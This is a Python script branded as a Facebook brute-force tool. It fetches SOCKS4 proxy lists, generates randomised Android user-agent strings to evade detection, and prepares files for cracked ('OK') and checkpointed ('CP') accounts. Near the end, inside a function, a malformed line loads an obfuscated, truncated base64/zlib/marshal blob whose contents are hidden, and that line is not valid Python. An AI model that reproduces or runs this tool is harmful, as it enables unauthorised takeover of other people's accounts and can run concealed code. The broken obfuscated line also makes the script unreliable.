import os

import re

import bs4

import sys

import json

import rich

import time

import random

import datetime

import requests



from concurrent.futures import ThreadPoolExecutor as Trd

from time import sleep, strftime

from rich.console import Console

from rich.columns import Columns

from rich import print as Cetak

from rich.tree import Tree

from rich.panel import Panel

from random import choice as rc

from random import randint as rr

from random import randrange as rg

from rich.progress import Progress

from rich.progress import SpinnerColumn

from rich.progress import TextColumn

from rich.progress import BarColumn

from rich.progress import TimeElapsedColumn



(

	ok,

	cp,

	loop,

	id,

	id2,

	pwp,

	pwt

)   =   (

	0,

	0,

	0,

	[],

	[],

	[],

	[]

	)

(

	P,

	M,

	K,

	B,

	H,

	N

)   =   (

	'\x1b[1;97m',

	'\x1b[1;91m',

	'\x1b[1;93m',

	'\x1b[1;94m',

	'\x1b[1;92m',

	'\x1b[0m'

)

sys.stdout.write(

	'\x1b]2; Simple BF Facebook V2\x07'

)

now = datetime.datetime.now(

	)

if    3 <= now.hour < 12: 

	sapa = "Pagi"

elif 12 <= now.hour < 15: 

	sapa = "Siang"

elif 15 <= now.hour < 18: 

	sapa = "Sore"

else:

	sapa = "Malam"

dta = {

	'1':'Jan',

	'2':'Feb',

	'3':'Mar',

	'4':'Apr',

	'5':'Mei',

	'6':'Jun',

	'7':'Jul',

	'8':'Agu',

	'9':'Sepr',

	'10':'Okt',

	'11':'Nov',

	'12':'Des'

	}

dtb = {

	'1':'Januari',

	'2':'Februari',

	'3':'Maret',

	'4':'April',

	'5':'Mei',

	'6':'Juni',

	'7':'Juli',

	'8':'Agustus',

	'9':'September',

	'10':'Oktober',

	'11':'November',

	'12':'Desember'

	}

dth = {

	'Monday':'Senin',

	'Tuesday':'Selasa',

	'Wednesday':'Rabu',

	'Thursday':'Kamis',

	'Friday':'Jumat',

	'Saturday':'Sabtu',

	'Sunday':'Minggu'

	}

tgl = now.day

mon = dta[

	(

		str(

			now.month

		)

	)

]

bln = dtb[

	(

		str(

			now.month

		)

	)

]

thn = now.year

day = dth[

	(

		str(

			strftime(

				"%A"

			)

		)

	)

]

jam = now.strftime(

	"%I"

	)

mnt = now.strftime(

	"%M"

	)

dtk = now.strftime(

	"%S"

	)

wkt = (

		'%s,%s-%s-%s,%s:%s:%s,%s'

		%

		(

		day,

		tgl,

		bln,

		thn,

		jam,

		mnt,

		dtk,

		sapa

		)

	)

okc = (

	'OK-'

	+

	str(tgl)

	+

	'-'

	+

	str(mon)

	+

	'-'

	+

	str(thn)

	+

	'.txt'

	)

cpc = (

	'CP-'

	+

	str(tgl)

	+

	'-'

	+

	str(mon)

	+

	'-'

	+

	str(thn)

	+

	'.txt'

	)

try:

	prox = requests.get(

		'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'

	).text 

	open(

		'p.txt','w'

	).write(

		prox

	)

except Exception as e:

	Console(width=48).print(

		Panel(

			"[bold purple]* [bold #FF00D4]error 404, jaringan lemot![bold purple] *",

			width=48,

			style=f"bold purple",

			),

		justify="center",

		)

	exit(

	)

def Bersih():

	os.system(

		"cls"

		if os.name == "nt"

		else "clear"

	)

def Back_Menu():

	Main_Menu(

	)

def Banner():

	Bersih(

	)

	Console(width=48).print(

		Panel(

			'''[bold #FF00D4] ⠀⠀⠀⠀⠀⠀⢁⣴⣶⣶⣤⣀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣠⣶⣶⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⢀⡜⣽⣃⣿⣿⣿⣿⣿⣦⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⠈⢻⣦⠀⠠⡀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⣰⠋⣰⠇⣸⡟⠙⢻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠀⢀⣿⣷⡀⠘⢆⠀⠀⠀⠀\n⠀ ⠀⣰⠃⣴⡏⢀⣿⠁⠀⠀⠙⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡿⠋⢸⡇⠀⣿⣿⣷⡀⠀⠳⡀⠀⠀\n ⠀⢠⠏⣴⡿⠀⣾⡏⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⣤⣤⣤⣤⣾⣿⣿⣿⠋⠀⠀⠈⣇⠀⠘⣿⣿⣷⡀⠀⠹⡄⠀\n ⠀⣿⠏⢸⣗⣼⡿⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣷⣄⠀⠀⠀⢹⡀⠀⠻⣿⣿⣷⡀⠀⠸⡀\n ⢸⠇⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⣤⣼⣟⢋⡬⣽⡟⣟⡛⢿⢿⡛⠻⡿⠿⣿⣦⠀⠀⠈⣧⠀⠀⢻⣿⣿⣿⡄⠀⢇\n ⣿⣶⣾⣿⣿⠃⠀⠀⠀⠀⢀⣞⡟⣯⣴⣾⣿⠃⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠸⣇⠀⢉⣽⣿⣿⣿⡄⠈\n ⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⡼⣞⣾⢿⣿⣿⡏⠀⣿⣿⡏⣿⣿⢻⣿⣿⣿⣿⣿⣿⡇⠀⢀⡙⣆⠀⠠⣾⣿⣿⣷⠀\n ⠹⠿⠿⠋⠀⠀⠀⠀⠀⢰⡿⣹⡏⡿⣽⡿⠀⠀⠈⣟⣯⢿⣿⠀⠛⠿⣿⣿⣿⣿⣿⡀⠀⠀⠘⢷⣄⣨⣿⣿⠟⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠃⣿⣿⣇⣿⣡⣴⣶⠐⠭⣿⡇⡟⣿⣿⠟⢾⡏⢿⣿⣿⣿⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀\n ⠂⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⡿⣿⣿⣿⠁⠛⠛⠀⠟⠿⣹⠁⠀⠁⢠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⣿⣿⣿⣏⠀⠀⠀⠀⠀⠇⠀⠀⠀⣣⢿⣯⢾⣿⡿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢠⢿⣿⣿⣾⡀⠀⠀⠈⠉⠀⠀⠀⠀⣠⡿⣿⣾⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣾⠘⣿⣿⣿⣦⣄⣀⠀⠀⣀⡴⠞⣿⣁⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣬⣿⣿⣿⣿⣿⣿⡛⠋⠁⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⣿⣿⣿⠿⢿⢿⢻⣅⠈⠳⠤⣀⡀⠾⣿⡛⣿⣟⡿⠿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣇⡟⠉⠀⠀⠈⢿⣾⣧⣷⡀⢰⣾⣽⣷⣿⣿⠟⣿⡏⠁⠈⢻⣷⢣⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣯⣿⠁⠀⠀⠀⠀⠈⢹⡿⣏⡌⠄⢻⡏⠀⠏⠋⠀⠞⣫⡃⠀⠈⣿⣯⢇⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⢠⡀⢊⡾⠆⠄⠂⠀⠀⠀⠀⠀⠀⡳⡡⢧⡀⣿⣿⣾⡄⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣰⡿⣿⣿⠀⠀⠀⠀⠀⢰⠁⠀⢺⣲⡓⡀ ⠀⠀⢄⠀⠀⠕⣖⡇⢈⣼⣿⡜⣷⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣿⡇⣿⣿⡀⠀⠀⠀⠀⠘⠀⢀⡼⣿⡿⢭⡂⠀⠀ ⠳⡀⠁⣸⣿⣋⠈⣿⣿⠹⡇⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⡿⣿⣿⠻⡇⠀⠀⠀⠀⠀⠀⣼⠀⢛⣧⠅⡏⠳⣦ ⡀⢃⣰⣟⠻⡆⠀⣼⣿⣧⣷⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⠃⢻⡏⢸⣷⠀⠀⠀⠀⠀⣸⡇⠀⠀⠻⢿⡅⠀⣶⣿⣶⣴⣿⣤⣽⣾⣾⣿⣿⡟⣿⡀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠘⡆⠸⣧⣼⢹⡆⠀⠀⠀⠀⣿⣿⣦⣤⣸⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠰⠃⠀⢻⡏⣼⣷⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡇⠘⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠂⠀⠀⢰⣿⣿⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⡿⣧⣿⣹⡇⠀⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⡾⢣⣿⣿⡀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢸⡇⣿⠇⣿⠁⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⢀⣠⠾⠛⠁⢠⡿⡿⣿⠇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⡇⠋⠀⡯⣀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠈⡆⠀⠀⠔⠋⣼⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⡇⠀⠀⠀⠀⠁⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠁⢀⣠⡴⣻⣿⣿⣿⡆⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⠁⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⣠⠖⠋⠉⠉⠙⢿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⠀⢰⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⡤⠊⠀⠀⠀⠠⠀ ⠀⠈⢻⣿⣿⠀⠀⠀⠸⣿⣿⣿⣿⣟⣾⠷⣄⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⡠⠊⡀⠀⠀⠠⠈⠀⠀ ⠀⠀⠈⣿⣿⡆⠀⠀⠀⣿⣿⣿⣿⠟⠁⠀⠙⡆⠀⡇⠀⠠⠁⠀         \n[bold purple]╭──────────────────────────────────────────╮\n│[bold #FF00D4] Brute Force Facebook Free V2 by Danzx.Kycawww [bold purple]│\n╰──────────────────────────────────────────╯''',

			width=48,

			title="[bold #545B5B][ [bold #FF0000]● [bold #FFFF00]● [bold #00FF00]●[bold #545B5B] ]",

			title_align="left",

			subtitle=f"[bold #FF00D4]* <[bold purple][underline]{wkt}[bold #FF00D4][/underline]> *",

			style=f"bold purple",

		)

	)

def User_Agent(): t = rc([f'CPH{rr(1700, 1899)}',f'CPH{rr(1800, 2399)}',f'I{str(rr(1920,2299))}']); u = rc([f'RMX{rr(1800, 2399)}',f'RMX{rr(3000, 3399)}',f'vivo {rr(1000, 2000)}']); v = rc([f'itel A{str(rr(11,63))} {rc(["","Lite","Pro","Plus",""])}','itel A512W']); w = rc([f'RT{str(rr(1,6))}',f'WP{str(rr(1,28))}',f'C{str(rr(10,32))}{rc([" Pro","_Pro",""])}']); x = rc([f'V{rr(1800,2399)}{rc(["A",""])}',f'V{rr(3000,3399)}{rc(["A",""])}']); y = rc([f"Infinix X{str(rr(550,699))}{rc(['B','C','D','E','F',''])}",f"Infinix X{str(rr(5511,5516))}{rc(['B','C','D','E','F',''])}",f"Infinix X{str(rr(6711,6899))}{rc(['B','C','D','E','F',''])}"]); z = rc([f'Redmi {str(rr(1,16))}{rc(["A","A Dual","AT","C","C NFC","5G","Pro","Plus","Prime","Prime+","Prime+ 5G","I","T","T NFC"])}',f'Redmi Note {str(rr(1,16))} {rc(["A","5G","Lite","Lite 5G","Lite 5G NE","Plus","Pro","Pro+","Pro+ 5G","Pro Max","Prime","R","R 5G","S","S 5G","T","T 5G","T Pro","T Pro+"])}']); a = rc([f'{rr(5,9)}.0{rc([".0",""])}',f'{str(rr(7,14))}']); b = rc([f'{t}',f'{u}',f'{v}',f'{w}',f'{x}',f'{y}',f'{z}']); c = rc(['en-us','en-gb','id-id', 'ms-my','zh-cn','in-id']); d = rc(['O11019', 'NMF26F', 'NRD90M', 'MRA58K', 'LMY47I']); e = rc(['RKQ1','RP1A','PPR1','QP1A','SP1A','TP1A','OPM1']); f = rc([f'00{random.randint(1,9)}', f'0{str(rr(10,20))}']); g = ( f'{e}.{str(random.randrange(130000, 230000))}.{f}' ); h = ( f'{rr(99, 123)}.0.{rg(5000,  6399)}.{rr(10, 299)}' ); return rc([f"Mozilla/5.0 (Linux; Android {a}; {b} Build/{rc([f'{g}',f'{d}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc([f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a}) NABar/1.0',f' T7/7.0 baidubrowser/7.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' T7/7.5 baidubrowser/7.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' T7/9.1 baidubrowser/7.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})NULL',f' T5/2.0 baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' T5/2.0 baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' T5/2.0 bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,9))}.{str(rr(0,9))}',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})NULL',f' T5/2.0 bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' bdbrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}'])}", f"Mozilla/5.0 (Linux; Android {a}; {b} Build/{rc([f'{g}',f'{d}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc(['',f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' GoogleApp/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f' GSA/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(rr(300,399))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};] FBNV/1',f' Edg/{str(rr(73,129))}.0.{str(rr(1200,2999))}.{str(rr(73,250))}',' EdgW/1.0','/TansoDL',' youcare-android-app',''])}", f"Mozilla/5.0 (Linux; Android {a}; {b}{rc(['',f' Build/{d}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{h} Mobile Safari/537.36{rc(['',f' EdgA/{str(rr(30,129))}.0.{str(rr(1100,1299))}.{str(rr(10,99))}',f' AlohaBrowser/{str(rr(1,4))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,4))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}',f' OPX/{str(rr(1,2))}.{str(rr(0,9))}',' BanglaBrowser/2.0.2',''])}", f"Mozilla/5.0 (Linux; U; Android {a}; {c}; {b} Build/{rc([f'{g}',f'{d}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc([f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}',f' OPT/{str(rr(1,2))}.{str(rr(0,9))}',f' PHX/{str(rr(4,14))}.{str(rr(0,9))}',f' T5/2.0 bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}','Vast Browser/2.7.0'])}", f"Mozilla/5.0 (Linux; U; Android {a}; {c}; {b} Build/{rc([f'{g}',f'{d}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h}{rc([' HiBrowser/v2.22.0.2 UWS/',f' Quark/{str(rr(1,6))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,999))}',f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}'])} Mobile Safari/537.36", f"Mozilla/5.0 (Linux; Android {a}; {rc([f'{x}',f'{y}',f'{z}'])}{rc(['',f' Build/{d}',f' Build/{g}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc(['',f' VivoBrowser/{str(rr(2,17))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}'])}", f"Mozilla/5.0 (Linux; Android {a}; {rc(['VIVO ',''])}{x} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{h} Mobile Safari/537.36{rc(['',f' AlohaBrowser/{str(rr(3,4))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,2))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}'])}"])

def Ikuti_Boleh_Ya(cok):

	parser = bs4.BeautifulSoup

	try:
	import marshal, zlib, base64=(marshal.loads(zlib.decompress(base64.b64decode(b'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